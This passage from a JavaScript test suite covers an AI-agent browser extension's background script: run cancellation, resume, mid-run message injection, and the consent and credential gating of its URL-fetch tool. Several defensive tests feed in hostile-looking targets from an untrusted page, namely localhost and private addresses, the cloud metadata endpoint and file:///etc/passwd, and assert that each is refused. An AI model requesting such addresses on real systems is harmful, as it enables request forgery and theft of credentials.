    } }, { tab: { id: 21 } });

    assert.ok(Array.isArray(res.data.answerMedia) && res.data.answerMedia.length === 1, "answerMedia rides the run result");
    assert.equal(res.data.answerMedia[0].image, "data:image/png;base64,CATPIC", "…carrying the serialized crop");
    assert.equal(res.data.answerMedia[0].label, "the best cat");
});

test("CAPTURE_TAB waits out a transient rate-limit quota and retries (a screenshot burst)", async () => {
    // Chrome caps captureVisibleTab at ~2/sec; a burst of look()/locate() trips MAX_CAPTURE_VISIBLE_TAB_CALLS_
    // PER_SECOND. That's transient — wait out the window and retry instead of failing the step with an error the
    // model can't act on.
    let n = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onCaptureTab: () => {
            n++;
            if (n < 3) throw new Error("Failed to execute 'captureVisibleTab': MAX_CAPTURE_VISIBLE_TAB_CALLS_PER_SECOND quota exceeded.");
            return "data:image/png;base64,SHOT";
        },
    });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { id: 4, windowId: 1 } });
    assert.equal(n, 3, "retried past the transient quota (2 blocked, then success)");
    assert.equal(res.data, "data:image/png;base64,SHOT", "returned the screenshot after the wait");
});

test("CANCEL_RUN aborts a background run's in-flight model call → the run resolves cancelled", async () => {
    // The HUD's "Cancel agent run": abort the run's controller mid-generation. The loop threads the
    // signal into fetchLLM (kills the slow call) and converts the AbortError to a clean { cancelled }.
    let sawSignal = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => new Promise((_, reject) => {
            sawSignal = !!call.opts.signal;
            const abort = () => { const e = new Error("aborted"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal.aborted) return abort();
            call.opts.signal.addEventListener("abort", abort);
        }),
    });
    const pending = bg.send({ type: "START_RUN", payload: {
        runId: "runC", task: "x", systemPrompt: "sys", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    await new Promise(r => setTimeout(r, 0));   // let the run reach its in-flight model call
    bg.send({ type: "CANCEL_RUN", payload: { runId: "runC" } });   // fire-and-forget (no response)
    const res = await pending;
    assert.equal(sawSignal, true, "the run's model fetch received the abort signal");
    assert.ok(res.data && res.data.cancelled, "the aborted run resolves as cancelled (not an error)");
});

test("CANCEL_RUN for an unknown run id is a harmless no-op", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    bg.send({ type: "CANCEL_RUN", payload: { runId: "ghost" } });   // nothing registered → no throw
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] }, requestId: "rz" });
    assert.equal(res.data, "ok", "a later request is unaffected");
});

test("CANCEL_ALL_RUNS (the popup panic button) aborts every live run and reports the count", async () => {
    // Two runs both parked at their in-flight model call. The panic button aborts all controllers → each
    // resolves { cancelled: true }; the response reports how many were live.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => new Promise((_, reject) => {
            const abort = () => { const e = new Error("aborted"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal?.aborted) return abort();
            call.opts.signal?.addEventListener("abort", abort);
        }),
    });
    const base = { systemPrompt: "s", tools: [], model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools" };
    const p1 = bg.send({ type: "START_RUN", payload: { ...base, runId: "all1", task: "a" } }, { tab: { id: 1 } });
    const p2 = bg.send({ type: "START_RUN", payload: { ...base, runId: "all2", task: "b" } }, { tab: { id: 2 } });
    await new Promise(r => setTimeout(r, 0));   // let both reach their in-flight model call
    const res = await bg.send({ type: "CANCEL_ALL_RUNS", payload: {} });
    assert.equal(res.data.cancelled, 2, "both live runs were counted + aborted");
    assert.ok((await p1).data?.cancelled, "run 1 resolved cancelled");
    assert.ok((await p2).data?.cancelled, "run 2 resolved cancelled");
    await new Promise(r => setTimeout(r, 0));   // let each run's .finally() clear its controller
    // Idempotent: nothing live now → 0.
    const again = await bg.send({ type: "CANCEL_ALL_RUNS", payload: {} });
    assert.equal(again.data.cancelled, 0, "a second call finds nothing to stop");
});

test("RESUME_RUN continues a stored background run with its accumulated history (+ tab-ownership guard)", async () => {
    // Phase 2: after a background run settles, its history + payload are kept (bgRuns). A RESUME_RUN from
    // the SAME tab re-enters the loop from that history with a follow-up task; another tab can't, and an
    // unknown/evicted run reports an actionable error rather than silently starting fresh.
    const calls = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            calls.push(call.body.messages.map(m => ({ role: m.role, content: m.content })));
            return jsonResponse({ choices: [{ message: { content: calls.length === 1 ? "first answer" : "second answer" } }] });
        },
    });
    const first = await bg.send({ type: "START_RUN", payload: {
        runId: "rr1", task: "first task", systemPrompt: "SYS", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { tab: { id: 9 } });
    assert.equal(first.data.summary, "first answer");

    // Resume from the OWNING tab → continues with the prior history + the follow-up.
    const second = await bg.send({ type: "RESUME_RUN", payload: { runId: "rr1", task: "follow up" } }, { tab: { id: 9 } });
    assert.equal(second.data.summary, "second answer");
    const resumed = calls.at(-1);
    assert.equal(resumed[0].content, "SYS", "resume keeps the ORIGINAL system prompt (from stored history)");
    assert.equal(resumed[1].content, "first task");
    assert.ok(resumed.some(m => m.role === "assistant" && m.content === "first answer"), "the prior answer is in the resumed context");
    assert.equal(resumed.at(-1).content, "follow up", "the follow-up is the last user turn");

    // A DIFFERENT tab may NOT resume it (ownership guard).
    const wrongTab = await bg.send({ type: "RESUME_RUN", payload: { runId: "rr1", task: "steal" } }, { tab: { id: 99 } });
    assert.match(wrongTab.error, /another tab/);

    // An unknown / evicted run → actionable error, no run started.
    const ghost = await bg.send({ type: "RESUME_RUN", payload: { runId: "nope", task: "x" } }, { tab: { id: 9 } });
    assert.match(ghost.error, /No resumable run/);
});

test("START_RUN with resumeMessages continues that history, returns the final messages, and does NOT re-announce", async () => {
    // The createAgent-handle path: the page sends its prior control.messages so the background CONTINUES it
    // (fixing 'a.messages empty' + 'run() again resets the session'). The final history rides back so the
    // handle stays authoritative; a continuation must NOT re-emit `agent` (that wiped the sidebar session).
    const calls = [], tabEvents = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { calls.push(call.body.messages.map(m => ({ role: m.role, content: m.content }))); return jsonResponse({ choices: [{ message: { content: "answer" } }] }); },
        onTabMessage: (_tabId, msg) => { if (msg?.type === "ML_DEBUG_TO_PAGE") tabEvents.push(msg.event); },
    });
    const prior = [{ role: "system", content: "SYS" }, { role: "user", content: "first" }, { role: "assistant", content: "ans1" }];
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "rc1", task: "second", systemPrompt: "SYS", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off", resumeMessages: prior,
    } }, { tab: { id: 3 } });

    assert.deepEqual(calls.at(-1), [...prior, { role: "user", content: "second" }], "continued from the prior history + the new task");
    assert.ok(Array.isArray(res.messages) && res.messages.some(m => m.content === "second"), "the response returns the final messages (for control.messages sync)");
    assert.ok(res.messages.some(m => m.role === "assistant" && m.content === "answer"), "…including the new answer");
    assert.ok(!tabEvents.some(e => e.kind === "agent"), "a continuation does NOT re-announce the session (no sidebar reset)");
    assert.ok(tabEvents.some(e => e.kind === "agent-result"), "but the result IS emitted");
});

test("INJECT_MESSAGE steers a RUNNING background run (drained at the next step boundary) + ownership guard", async () => {
    const calls = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            calls.push(call.body.messages.map(m => ({ role: m.role, content: m.content })));
            // step 1 → a tool call (a boundary to inject at); step 2 → the final answer.
            return calls.length === 1
                ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "noop", arguments: "{}" } }] } }] })
                : jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type === "RUN_TOOL_IN_PAGE" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                // A wrong tab may NOT steer (ownership guard); the owning tab may.
                const bad = await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "inj1", text: "NOPE" } }, { tab: { id: 99 } });
                assert.equal(bad.data, false, "another tab can't inject into the run");
                const ok = await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "inj1", text: "STEER ME" } }, { tab: { id: 5 } });
                assert.equal(ok.data, true, "the owning tab injects");
                return { result: "noop ok" };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "inj1", task: "go", systemPrompt: "S",
        tools: [{ name: "noop", requiresApproval: false, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 5 } });

    assert.ok(calls.at(-1).some(m => m.role === "user" && m.content === "STEER ME"), "the mid-run injected message reached the model at the next step");
    // Unknown / finished run → no-op (the page's run()-flush picks up anything too late).
    const ghost = await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "gone", text: "x" } }, { tab: { id: 5 } });
    assert.equal(ghost.data, false, "injecting into a finished/unknown run is a harmless no-op");
});

// --- ml.fetch (FETCH_URL): uncredentialed GET + the unforgeable per-URL consent boundary ---

const fetchResponse = (body, { contentType = "text/plain", url = "http://x/", status = 200, headers = {} } = {}) => {
    const all = { "content-type": contentType };
    for (const [k, v] of Object.entries(headers)) all[String(k).toLowerCase()] = v;
    return {
        ok: status >= 200 && status < 300, status, url,
        headers: { get: (h) => (all[String(h).toLowerCase()] ?? null) },
        text: async () => body,
    };
};

test("FETCH_URL: exposes ONLY the safelisted response headers — never Cookie/Authorization/Set-Cookie", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => fetchResponse('[]', {
            contentType: "application/json", url: call.url,
            headers: {
                "Link": '<https://api/x?page=2>; rel="next"', "ETag": 'W/"abc"', "Cache-Control": "max-age=60",
                // Sensitive — must NOT surface:
                "Set-Cookie": "session=SECRET; HttpOnly", "Authorization": "Bearer SECRET", "X-Csrf-Token": "SECRET",
            },
        }),
    });
    const r = await bg.send({ type: "FETCH_URL", payload: { url: "https://api.example/list" } }, { tab: { id: 1, url: "https://api.example/" }, url: "https://api.example/" });
    assert.equal(r.data.headers.link, '<https://api/x?page=2>; rel="next"', "safelisted Link is exposed");
    assert.equal(r.data.headers.etag, 'W/"abc"', "safelisted ETag is exposed");
    assert.equal(r.data.headers.cacheControl, "max-age=60", "safelisted Cache-Control is exposed");
    // The whole serialized result must not contain ANY of the secrets — they were never read.
    const blob = JSON.stringify(r.data);
    assert.ok(!/SECRET/.test(blob), "no Set-Cookie / Authorization / CSRF value leaks into the result");
    assert.ok(!("cookie" in r.data.headers) && !("authorization" in r.data.headers), "sensitive header fields aren't even present");
});

test("FETCH_URL: a trusted surface fetches UNCREDENTIALED and classifies the body", async () => {
    let creds, method;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { creds = call.opts?.credentials; method = call.opts?.method; return fetchResponse('{"ok":true}', { contentType: "application/json", url: call.url }); },
    });
    // No sender.tab → "surface" (the extension's own realm) → unrestricted.
    const res = await bg.send({ type: "FETCH_URL", payload: { url: "https://api.example/data.json" } });
    assert.equal(creds, "omit", "the fetch sends NO cookies (uncredentialed) — never the user's authenticated data");
    assert.equal(method, "GET", "GET only");
    assert.equal(res.data.type, "json");
    assert.deepEqual(res.data.json, { ok: true }, "JSON is pre-parsed");
});

test("FETCH_URL: sends browser-IDENTITY headers (UA + Accept-Language) so it isn't blocked as a bare bot — but NO cookies", async () => {
    let headers, creds;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { headers = call.opts?.headers; creds = call.opts?.credentials; return fetchResponse("<html>ok</html>", { contentType: "text/html", url: call.url }); },
    });
    await bg.send({ type: "FETCH_URL", payload: { url: "https://github.com/o/r/blob/main/servers.json" } });
    assert.match(headers["User-Agent"], /Chrome\/\d/, "sends the browser's real User-Agent (public identity)");
    assert.equal(headers["Accept-Language"], "en-US,en;q=0.9", "sends a browser-style Accept-Language from navigator.languages");
    assert.match(headers["Accept"], /text\/html/, "sends a browser-like Accept");
    // The identity is PUBLIC — the private data (cookies) is NOT sent on the uncredentialed path.
    assert.equal(creds, "omit", "still no cookies — browser info only, not the user's authenticated session");
    assert.ok(!("Cookie" in headers) && !("cookie" in headers), "never sets a Cookie header here");
});

test("FETCH_URL: a JSON body gets a `schema` (TS-like shape); a non-JSON body does not", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => call.url.endsWith(".json")
            ? fetchResponse('{"id":7,"items":[{"name":"a"},{"name":"b"}]}', { contentType: "application/json", url: call.url })
            : fetchResponse("plain text, not json", { contentType: "text/plain", url: call.url }),
    });
    const j = await bg.send({ type: "FETCH_URL", payload: { url: "https://api.example/data.json" } });
    assert.equal(j.data.schema, "{ id: number, items: { name: string }[] /* 2 items */ }", "the parsed JSON carries its shape");
    const t = await bg.send({ type: "FETCH_URL", payload: { url: "https://api.example/readme.txt" } });
    assert.equal(t.data.schema, undefined, "a non-JSON body has no schema");
    assert.equal(t.data.json, undefined);
});

test("FETCH_URL: a mislabelled body classifies by content/extension (raw .ts served as text/plain → code)", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: (call) => fetchResponse("const x = 1;\nexport default x;", { contentType: "text/plain", url: call.url }) });
    const res = await bg.send({ type: "FETCH_URL", payload: { url: "https://raw.githubusercontent.com/o/r/main/x.ts" } });
    assert.equal(res.data.type, "code");
    assert.equal(res.data.language, "typescript");
    assert.equal(res.data.typeByHeader, null, "header was generic");
});

test("SECURITY (FETCH_URL): an untrusted page with NO consent is refused — localhost/private/public alike, BEFORE any network", async () => {
    // The reachable-address range is governed SOLELY by consent — we deliberately do NOT range-block (the human
    // approves each URL). So without consent, NOTHING is reachable regardless of address, and no request is sent.
    let fetched = false;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => { fetched = true; return fetchResponse("x"); } });
    const addrs = [
        "http://localhost:8080/admin",
        "http://127.0.0.1/x",
        "http://10.0.0.5/internal",
        "http://192.168.1.1/router",
        "http://169.254.169.254/latest/meta-data/",   // cloud metadata
        "https://public.example/data.json",
    ];
    for (const url of addrs) {
        const res = await bg.send({ type: "FETCH_URL", payload: { url } }, { tab: { id: 9, url: "https://evil.example/" } });
        assert.ok(res.error && /hasn't been approved/i.test(res.error), `${url} refused without consent`);
    }
    assert.equal(fetched, false, "the gate is BEFORE the network — no request sent for any un-consented address");
    // A non-http(s) scheme is refused outright (a page can't turn this into a file:// / data: read).
    const f = await bg.send({ type: "FETCH_URL", payload: { url: "file:///etc/passwd" } }, { tab: { id: 9, url: "https://evil.example/" } });
    assert.ok(/only http\(s\)/i.test(f.error), "file:// refused");
    const c = await bg.send({ type: "FETCH_URL", payload: { url: "chrome://settings" } }, { tab: { id: 9, url: "https://evil.example/" } });
    assert.ok(/only http\(s\)/i.test(c.error), "chrome:// refused");
});

test("FETCH_URL: an untrusted page's UNCREDENTIALED SAME-ORIGIN fetch is FREE (incl. rendered) — cross-origin / credentialed stay gated", async () => {
    // A same-origin read grants nothing the page couldn't do itself (`fetch()`/navigate its own origin), so it
    // needs no grant — a plain GET AND a rendered load (which renders in the page's own session, like a
    // same-origin navigate). Cross-origin and `credentials` (as-you) stay gated. sender.url = the requesting FRAME.
    let fetchedUrl = null;
    const bg = loadBackground({ config: baseConfig(), onFetch: (call) => { fetchedUrl = call.url; return fetchResponse('{"ok":1}', { contentType: "application/json", url: call.url }); } });
    const page = "https://site.example/dashboard";
    const send = (payload) => bg.send({ type: "FETCH_URL", payload }, { tab: { id: 9, url: page }, url: page });

    const same = await send({ url: "https://site.example/api/data.json" });
    assert.ok(same.data && !same.error, "same-origin uncredentialed fetch is allowed with NO grant");
    assert.equal(fetchedUrl, "https://site.example/api/data.json", "the same-origin fetch actually ran");

    const cross = await send({ url: "https://other.example/x" });
    assert.ok(cross.error && /hasn't been approved/i.test(cross.error), "cross-origin still needs consent");

    // Same-origin RENDERED is FREE now — it passes the gate and takes the INCOGNITO (session-less) render path,
    // so with no incognito access it fails DOWNSTREAM with the incognito guidance — NOT the "hasn't been
    // approved" gate error. (Proves both: not gated, AND session-less — a session render would always prompt.)
    const rendered = await send({ url: "https://site.example/spa", rendered: true });
    assert.ok(!(rendered.error && /hasn't been approved/i.test(rendered.error)), "same-origin RENDERED is not gated");
    assert.ok(rendered.error && /incognito/i.test(rendered.error), "same-origin RENDERED renders in incognito (session-less), not the session");

    const cred = await send({ url: "https://site.example/api", credentials: true });
    assert.ok(cred.error && /wasn't approved/i.test(cred.error), "same-origin CREDENTIALED stays locked (as-you)");
});

test("SECURITY (FETCH_URL): the SAME addresses become reachable once approved via the fetch_url tool (consent is the sole boundary)", async () => {
    // Prove the boundary is EXACTLY consent: drive a real run, approve fetch_url for a localhost URL, and it
    // fetches — same address that was refused above. Consent grows ONLY here (the approval), unforgeably.
    let n = 0;
    const target = "http://localhost:8080/internal.json";
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            // The agent's model turns hit the LLM endpoint; the ml.fetch hits the target.
            if (call.url === baseConfig().chatUrl) {
                return (++n === 1)
                    ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "fetch_url", arguments: JSON.stringify({ url: target }) } }] } }] })
                    : jsonResponse({ choices: [{ message: { content: "done" } }] });
            }
            return fetchResponse('{"secret":42}', { contentType: "application/json", url: call.url });   // the delegated ml.fetch
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
            }
            // The delegated fetch_url tool's run() calls ml.fetch → simulate that page round-trip back to FETCH_URL.
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "fetch_url" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                const r = await bg.send({ type: "FETCH_URL", payload: { url: target } }, { tab: { id: tabId, url: "https://evil.example/" } });
                return { result: r.error ? `Error: ${r.error}` : `ok ${JSON.stringify(r.data.json)}` };
            }
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "fu1", task: "read it", systemPrompt: "S",
        tools: [{ name: "fetch_url", requiresApproval: true, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    // The localhost URL was reachable ONCE approved — the SAME address the prior test refused. Consent grew only
    // via the approval (unforgeable); without it the delegated fetch would have been refused.
    assert.ok(res.data, "the run finished");
    assert.ok(bg.calls.some(c => c.url === target), "the localhost URL WAS fetched after approval (consent is the sole gate)");
});

test("SECURITY (FETCH_URL credentialed): an untrusted page can't fetch AS THE USER without a grant", async () => {
    // Credentialed = a "read any URL as you" primitive → an untrusted page needs a one-time grant (minted by an
    // approved fetch_url). No grant → REFUSED before any network, and execOpen/consent don't shortcut it.
    let fetched = false;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => { fetched = true; return fetchResponse("secret"); } });
    const r = await bg.send({ type: "FETCH_URL", payload: { url: "https://private.example/me", credentials: true } }, { tab: { id: 9, url: "https://evil.example/" } });
    assert.ok(r.error && /wasn't approved/i.test(r.error), "refused: no credentialed grant");
    assert.equal(fetched, false, "no credentialed fetch was made (gate is BEFORE the network)");
});

test("SECURITY (FETCH_URL rendered+credentials): an untrusted page can't render AS THE USER (open a session tab) without a grant", async () => {
    // A CREDENTIALED rendered fetch (rendered + credentials) opens a NORMAL tab that carries the user's session
    // → same as-you weight as a credentialed GET, so an untrusted page with no one-time grant is REFUSED before
    // ANY tab is opened. (The gate is before fetchRenderedContent; the exact "wasn't approved" error proves that
    // — a buggy fall-through would hit the unmocked chrome.tabs.create and surface a different error.)
    const bg = loadBackground({ config: baseConfig() });
    const r = await bg.send({ type: "FETCH_URL", payload: { url: "https://private.example/app", rendered: true, credentials: true } }, { tab: { id: 9, url: "https://evil.example/" } });
    assert.ok(r.error && /wasn't approved/i.test(r.error), "refused: no as-you grant → no session tab opened");
});

test("SECURITY (FETCH_URL rendered, uncredentialed): an untrusted page with NO consent is refused (incognito render is still gated)", async () => {
    // An UNCREDENTIALED rendered fetch (incognito — no session) is lower-risk, so it takes the rememberable
    // consent path — but an untrusted page that hasn't approved the URL is STILL refused before any window opens.
    const bg = loadBackground({ config: baseConfig() });
    const r = await bg.send({ type: "FETCH_URL", payload: { url: "https://spa.example/app", rendered: true } }, { tab: { id: 9, url: "https://evil.example/" } });
    assert.ok(r.error && /hasn't been approved|not been approved/i.test(r.error), "refused: no consent → no incognito window opened");
});

test("SECURITY (FETCH_URL credentialed): a fetch_url{credentials} ALWAYS gates, sends cookies once approved, and the grant is ONE-TIME", async () => {
    let n = 0, approvals = 0, credsUsed;
    const target = "https://private.example/me.json";
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === baseConfig().chatUrl) {
                return (++n === 1)
                    ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "fetch_url", arguments: JSON.stringify({ url: target, credentials: true }) } }] } }] })
                    : jsonResponse({ choices: [{ message: { content: "done" } }] });
            }
            credsUsed = call.opts?.credentials;
            return fetchResponse('{"me":"you"}', { contentType: "application/json", url: call.url });
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                approvals++;
                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
            }
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "fetch_url" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                const r = await bg.send({ type: "FETCH_URL", payload: { url: target, credentials: true } }, { tab: { id: tabId, url: "https://evil.example/" } });
                return { result: r.error ? `Error: ${r.error}` : `ok ${JSON.stringify(r.data.json)}` };
            }
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "cf1", task: "read my private data", systemPrompt: "S",
        tools: [{ name: "fetch_url", requiresApproval: true, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    assert.ok(res.data, "the run finished");
    assert.equal(approvals, 1, "a credentialed fetch ALWAYS gates (never auto-approved)");
    assert.equal(credsUsed, "include", "the approved fetch sent the user's cookies (credentials: include)");
    // ONE-TIME: the grant was consumed by that fetch → a repeat credentialed fetch of the SAME url re-prompts.
    const again = await bg.send({ type: "FETCH_URL", payload: { url: target, credentials: true } }, { tab: { id: 8, url: "https://evil.example/" } });
    assert.ok(again.error && /wasn't approved/i.test(again.error), "the credentialed grant is one-time — never remembered");
});

test("background-hosted reused-grant parity: a delegated readonly-try forwards `reused` onto the step", async () => {
    // A background run's readonly exec (delegated to the page) that re-read a CACHED ml.fetch URL must carry
    // the `reused` note onto its emitted step, same as the page-hosted path — the reported gap.
    const events = [];
    let n = 0;
    const url = "https://raw.githubusercontent.com/o/r/main/servers.json";
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => (++n === 1
            ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: JSON.stringify({ js: `ml.fetch("${url}").json` }) } }] } }] })
            : jsonResponse({ choices: [{ message: { content: "done" } }] })),
        onTabMessage: (_t, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE") events.push(msg.event);
            // The delegated readonly-try HANDLED it (cached fetch) → returns readonly:true + the reused grant.
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.readonlyTry) {
                return { readonly: true, result: "[…servers…]", reused: [{ kind: "fetch-url", detail: url }] };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "ru-bg", task: "reuse a fetch", systemPrompt: "S",
        tools: [{ name: "exec", requiresApproval: true, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: true, surface: "devtools",
    } }, { tab: { id: 4 } });

    const step = events.find(e => e.kind === "agent-step" && e.tool === "exec" && !e.pending);
    assert.ok(step, "the exec step emitted");
    assert.equal(step.approval, "readonly", "auto-approved via the delegated readonly-try");
    assert.deepEqual(step.reused, [{ kind: "fetch-url", detail: url }], "the reused cached URL rode onto the step (background parity)");
});

// --- button #3: "Approve + remember" — an approved exec persists its STATIC ml.fetch literals for the session ---

// Drive an exec whose inline ml.fetch literals should be offered as persistable grants, decide it via
// SET_APPROVAL (persist toggled by the caller), and return the disclosed gate + whether each URL is
// reachable by an UNTRUSTED page AFTER the run (i.e. purely via persisted consent, not the ephemeral
// exec-open grant, which is cleared when the delegation returns).
async function runExecWithFetch({ js, persist }) {
    const urlA = "http://localhost:8080/a.json", urlC = "http://localhost:8080/c.json";
    let n = 0, gate = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === baseConfig().chatUrl) {
                return (++n === 1)
                    ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: JSON.stringify({ js }) } }] } }] })
                    : jsonResponse({ choices: [{ message: { content: "done" } }] });
            }
            return fetchResponse('{"ok":1}', { contentType: "application/json", url: call.url });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                gate = msg.event;
                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true, persist } });
            }
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "exec" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                return { result: "exec ran" };
            }
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "b3", task: "fetch", systemPrompt: "S",
        tools: [{ name: "exec", requiresApproval: true, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    // AFTER the run (exec-open grant cleared): is each URL reachable by an untrusted page? Only persisted consent can allow it.
    const reach = async (url) => { const r = await bg.send({ type: "FETCH_URL", payload: { url } }, { tab: { id: 8, url: "https://evil.example/" } }); return !r.error; };
    return { res, gate, urlA, urlC, reachA: await reach(urlA), reachC: await reach(urlC) };
}

test("button #3: the exec gate DISCLOSES its static ml.fetch literals as grants (not dynamic ones)", async () => {
    const urlA = "http://localhost:8080/a.json";
    const { res, gate } = await runExecWithFetch({ js: `await ml.fetch("${urlA}"); await ml.fetch("http://localhost:8080/b.json"); await ml.fetch(dyn)`, persist: false });
    assert.ok(res.data, "the run finished");
    assert.ok(gate, "the exec gate opened");
    assert.deepEqual(gate.grants, [{ kind: "fetch-url", urls: [urlA, "http://localhost:8080/b.json"] }], "only the STATIC literals are disclosed (ml.fetch(dyn) is omitted)");
});

test("button #3: 'Approve + remember' (persist:true) makes the shown literals fetchable without re-approval; an unlisted URL stays refused", async () => {
    const { urlA, reachA, reachC } = await runExecWithFetch({ js: `await ml.fetch("http://localhost:8080/a.json")`, persist: true });
    assert.ok(reachA, `the remembered URL (${urlA}) fetches without re-approval after the run`);
    assert.equal(reachC, false, "an un-remembered URL is still refused (only the human-seen literals persisted)");
});

test("button #3: plain Approve (persist:false) does NOT remember — the URL is re-gated next time (one-off)", async () => {
    const { reachA } = await runExecWithFetch({ js: `await ml.fetch("http://localhost:8080/a.json")`, persist: false });
    assert.equal(reachA, false, "without persist, the exec-open grant is ephemeral — no session consent survives the run");
});

test("INJECT_MESSAGE with a sayId fans an agent-say-seen when the loop DRAINS it (the 'seen' indicator)", async () => {
    const events = [];
    let n = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => (++n === 1
            ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "noop", arguments: "{}" } }] } }] })
            : jsonResponse({ choices: [{ message: { content: "done" } }] })),
        onTabMessage: async (_t, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE") events.push(msg.event);
            if (msg?.type === "RUN_TOOL_IN_PAGE" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                // Steer mid-run WITH a sayId — the drain at the next boundary should fan a seen event for it.
                await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "seenrun", text: "steer me", sayId: "sy_bg1" } }, { tab: { id: 7 } });
                return { result: "noop ok" };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "seenrun", task: "go", systemPrompt: "S",
        tools: [{ name: "noop", requiresApproval: false, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 7 } });

    const seen = events.find(e => e?.kind === "agent-say-seen");
    assert.ok(seen, "the drain fanned an agent-say-seen event");
    assert.equal(seen.sayId, "sy_bg1", "keyed to the same sayId the page minted");
    assert.equal(seen.id, "seenrun", "carries the run hash so the sidebar can find the session");
});

// --- Durable resume: invalidate zombies (version/freshness), and re-emit a legit resurrection (fix C) ---

const bgSnap = (runId, tabId, over = {}) => ({
